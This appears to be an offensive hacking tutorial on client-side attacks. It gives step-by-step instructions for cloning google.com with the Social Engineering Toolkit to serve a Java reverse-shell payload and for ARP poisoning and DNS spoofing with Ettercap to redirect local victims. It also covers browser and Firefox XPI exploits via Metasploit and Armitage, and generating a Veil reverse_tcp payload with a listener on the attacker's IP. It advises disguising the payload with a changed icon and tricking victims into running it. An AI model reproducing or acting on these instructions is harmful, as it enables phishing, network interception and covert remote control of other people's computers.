    # Client Side Attack via Java Signed Applet


    It is a client side attack. When the hacker uses a `java signed applet` module
    in the `metasploit`, it will act as a web server and will have a website that
    has a `Java meterpreter reverse tcp` payload. It requires that the client has
    `java` application to execute the `java` payload. Anybody who goes to the website
    will download and install the payload, and the hacker can control the computer.
    It can hack any machine that has the `java` application. You set the `LHOST` and
    the `RHOST` (hacker ip address). The `LPORT` can be any port and `RPORT` put `8080`
    or `80` or any other port. Put the URI part as `/`.


    ## Social Engineering Toolkit Setup


    We will create a fake site for `www.google.com`. When any person in the local
    network wants to go to this web site, they will come to your fake website first,
    and the fake website will download the payload to the client computer.


    1. Go to `backtrack` then `exploitation tools` then `social engineering tools`
    then `social engineering toolkit` then the `set` command.

    2. Execute the following commands:

    ```bash

    sudo ./setup.py install

    ./set-update

    ./settoolkit

    ```

    3. Choose `1` for `social engineering attack`.

    4. Choose `2` for `website attack vectors`.

    5. Choose `1` for `java applet attack method`.

    6. Choose `2` for `site cloner`.

    7. Choose `n` to apply the method for the computers in the internal networks only.

    8. Put the IP for the hacker computer: `192.168.52.135`.

    9. Put the website you want to make phishing for: `http://www.google.com`.

    10. It will ask for the type of payload you want to use with `java signed applet`.
    Choose `12` which is `SE toolkit http reverse shell encryption support`.

    11. Put the port listener: `6666`.


    ## DNS Spoofing with Ettercap


    1. `edit` the file `etter.dns`. Put the IP for your phishing website.

    2. Write the command: `ettercap -G` to get the `ettercap` GUI.

    3. Put `sniff` and choose the interface, then choose `unified sniffing`.

    4. Choose `hosts` then go to `host list`.

    5. Go to `mitm` and choose `arp poisoning`, `poison one way`.

    6. In `plugins`, choose the `dns_spoof` plugin.

    7. Choose `start sniffing`.


    When the client in the internal network goes to the site, they will go to your
    phishing site. You will see in the `backtrack set` command a shell where you can
    write commands for the client computer. Try the commands `ipconfig`.


    ## Browser Exploitation via Armitage


    The hacker can make his computer a fake web server and host a website that utilizes
    client browser security holes to hack the computer. Any client visiting the hacker''s
    website will trigger the exploits for the browser.


    1. Start `armitage`.

    2. Search for `browser_autopone`.

    3. Put `LHOST` and `SRVHOST` the IP of the hacker machine, `Srvport=80`, `URI
    Path=/`.

    4. You can shorten the URL using `bitly.com`.

    5. When it hacks the client, it will open the `meterpreter` session.


    *Note: The antivirus will detect the `autopone` and block the connection.*


    ## Firefox XPI Attack


    The hacker can make his computer a fake web server and host a website with fake
    plugins. Any client visiting the hacker''s website will cause `firefox` to try
    and download the plugins, also downloading the `java meterpreter reverse tcp`
    payload.


    1. In `msfconsole`, search for `firefox`.

    2. Use the exploit `exploit/multi/browser/firefox_xpi_bootstrapped_addon`.

    3. Set the payload `windows/meterpreter/reverse_tcp`.

    4. Set the `Lhost` and `Rhost` (hacker computer), `Lport` (any port), and `srvport`
    to a suitable port.

    5. To see the sessions, write: `sessions -l`.

    6. To choose the first session, write: `session -I 1`.


    *Note: Firefox will detect the unverified plugins and will not install them.*


    ## Payload Generation with Veil


    Download the `Veil-master` tool:

    ```bash

    cd Veil-master

    cd setup

    ./setup.sh

    python veil.py

    ```

    1. Choose `list`.

    2. Choose the payload `9: Powershell/virtualalloc`.

    3. Choose `generate the payload`.

    4. Choose `msfvenom`.

    5. Choose `windows/meterpreter/reverse_tcp`.

    6. Choose the `lhost` (IP of the hacker machine: `192.168.52.135`).

    7. Choose any `lport`.

    8. Choose the name of the payload.


    Attach the payload with another program using an archive program such as `winrar`.
    Use the icon changer to change the icon. Ask the client to download the file using
    any trick. Operate the `multi-handler` tool using `msfcli` to hack the client:

    ```bash

    msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.52.135
    lport=4444

    ```

    Once the client is connected, the `meterpreter` session will open. Use `evilgrade`
    to manage the attack.


    ```bash

    # evilgrade

    # configure

    # show options

    # status

    ```

